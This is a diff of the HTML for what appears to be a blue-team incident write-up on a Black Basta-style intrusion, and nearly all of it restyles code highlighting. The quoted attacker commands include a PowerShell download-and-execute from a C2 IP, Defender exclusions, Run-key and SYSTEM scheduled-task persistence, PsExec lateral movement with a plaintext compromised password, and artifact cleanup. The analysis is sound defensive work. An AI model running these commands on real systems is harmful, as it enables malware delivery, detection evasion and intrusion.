@@ -727,7 +727,7 @@
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    LOLbins
+    LOLBins
   </span>
 </span>
 
@@ -1064,7 +1064,7 @@
     
 </h4>
 <p>At <strong>15:09:03</strong> the user extracted and opened <code>Financial Records.xlsm</code> (SHA256: 030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15). The macro designated itself as a trusted document by writing to the Excel security registry key:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">HKU\S-1-5-21-3865674213-28386648-2675066931-1120\SOFTWARE\Microsoft\Office\16.0\Excel\Security\Trusted Documents\TrustRecords\%USERPROFILE%/Downloads/Financial%20Records.xlsm</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>HKU\S-1-5-21-3865674213-28386648-2675066931-1120\SOFTWARE\Microsoft\Office\16.0\Excel\Security\Trusted Documents\TrustRecords\%USERPROFILE%/Downloads/Financial%20Records.xlsm</span></span></code></pre></div></div>
 <p>This self-trust registration suppresses the macro security warning on subsequent opens. At <strong>15:09:32</strong> the macro spawned <code>powershell.exe</code>.</p>
 <p><figure><img
     class="my-0 rounded-md"
@@ -1080,8 +1080,8 @@
     data-zoom-src="/blue_team/elk-black-basta/powershell.png"></figure>
 </p>
 <p>Decoding the base64 payload revealed:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s1">&#39;http://54.93.105.22/F6w1S48.vbs&#39;</span> <span class="n">-OutFile</span> <span class="s2">&#34;</span><span class="nv">$env:LOCALAPPDATA</span><span class="s2">\Temp\F6w1S48.vbs&#34;</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;</span><span class="nv">$env:LOCALAPPDATA</span><span class="s2">\Temp\F6w1S48.vbs&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#39;http://54.93.105.22/F6w1S48.vbs&#39;</span> -OutFile <span style="color:#e6db74">&#34;</span>$env:LOCALAPPDATA<span style="color:#e6db74">\Temp\F6w1S48.vbs&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>cmd.exe /c <span style="color:#e6db74">&#34;</span>$env:LOCALAPPDATA<span style="color:#e6db74">\Temp\F6w1S48.vbs&#34;</span></span></span></code></pre></div></div>
 <p>The macro downloaded a VBScript from the C2 server and executed it in the same command.</p>
 
 <h4 class="relative group"><span style="color:red">VBS and DLL Loading</span>
@@ -1132,14 +1132,14 @@
     
 </h4>
 <p>Within the same second at <strong>15:15</strong>, <code>WindowsUpdaterFX.dll</code> (MD5: 735AB5713DB79516CF350265FA7574E5) executed a series of commands. It added three Windows Defender exclusion paths to prevent detection of its artifacts:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;C:\ProgramData\Microsoft\ssh&#34;</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;%APPDATA%/Microsoft&#34;</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;%LOCALAPPDATA%/Temp&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Add-MpPreference -ExclusionPath <span style="color:#e6db74">&#34;C:\ProgramData\Microsoft\ssh&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Add-MpPreference -ExclusionPath <span style="color:#e6db74">&#34;%APPDATA%/Microsoft&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Add-MpPreference -ExclusionPath <span style="color:#e6db74">&#34;%LOCALAPPDATA%/Temp&#34;</span></span></span></code></pre></div></div>
 <p>It then wrote a registry Run key to maintain persistence across user logons:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater = wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater = wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs</span></span></code></pre></div></div>
 <p>A second persistence mechanism was established via a scheduled task WiindowsUpdate configured to execute as SYSTEM on every logon:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">schtasks /Create /RU &#34;NT AUTHORITY\SYSTEM&#34; /SC ONLOGON /TN &#34;WiindowsUpdate&#34;
-</span></span><span class="line"><span class="ln">2</span><span class="cl">  /TR &#34;C:\Windows\System32\regsvr32.exe /s %%localappdata%%\Temp\WindowsUpdaterFX.dll&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>schtasks /Create /RU &#34;NT AUTHORITY\SYSTEM&#34; /SC ONLOGON /TN &#34;WiindowsUpdate&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  /TR &#34;C:\Windows\System32\regsvr32.exe /s %%localappdata%%\Temp\WindowsUpdaterFX.dll&#34;</span></span></code></pre></div></div>
 
 <h4 class="relative group"><span style="color:red">Dropper and C2 Backdoor</span>
     <div id="dropper-and-c2-backdoor" class="anchor"></div>
@@ -1247,7 +1247,7 @@
     
 </h3>
 <p>With <code>PsExec64.exe</code> staged, the attacker used compromised credentials <code>financees.local\swhite</code> with password <code>b&lt;ZITx4h1</code> to authenticate to 10.10.11.170. Initial validation commands whoami and hostname confirmed remote execution was working. The attacker then propagated the implant using:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe</span></span></code></pre></div></div>
 <p>The <code>-c -f</code> flags copy and force-overwrite the executable to the remote host, and <code>-s</code> runs it as SYSTEM</p>
 <p><figure><img
     class="my-0 rounded-md"
@@ -1356,8 +1356,8 @@
     data-zoom-src="/blue_team/elk-black-basta/virustotal.png"></figure>
 </p>
 <p>At <strong>16:52:52</strong> and <strong>16:53:30</strong> the attacker ran cleanup commands to remove forensic artifacts from both Temp directories:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&#34;</span><span class="nv">$env:LOCALAPPDATA</span><span class="s2">\Temp\*&#34;</span> <span class="n">-Recurse</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&#34;C:\Users\swhite\Appdata\Local\Temp\*&#34;</span> <span class="n">-Recurse</span> <span class="n">-Force</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Remove-Item -Path <span style="color:#e6db74">&#34;</span>$env:LOCALAPPDATA<span style="color:#e6db74">\Temp\*&#34;</span> -Recurse -Force
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Remove-Item -Path <span style="color:#e6db74">&#34;C:\Users\swhite\Appdata\Local\Temp\*&#34;</span> -Recurse -Force</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
